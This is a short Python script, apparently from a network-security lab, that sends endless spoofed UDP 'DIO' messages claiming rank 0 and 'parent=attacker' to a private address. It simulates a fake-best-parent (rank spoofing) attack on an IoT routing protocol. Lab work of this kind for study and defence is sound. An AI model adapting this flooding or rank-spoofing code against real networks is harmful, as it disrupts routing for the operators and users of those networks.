import socket
import time

TARGET_IP = "172.20.0.100"
PORT = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Neighbor attack started (fake best parent)")

while True:
    payload = b"DIO|rank=0|parent=attacker"
    sock.sendto(payload, (TARGET_IP, PORT))
    
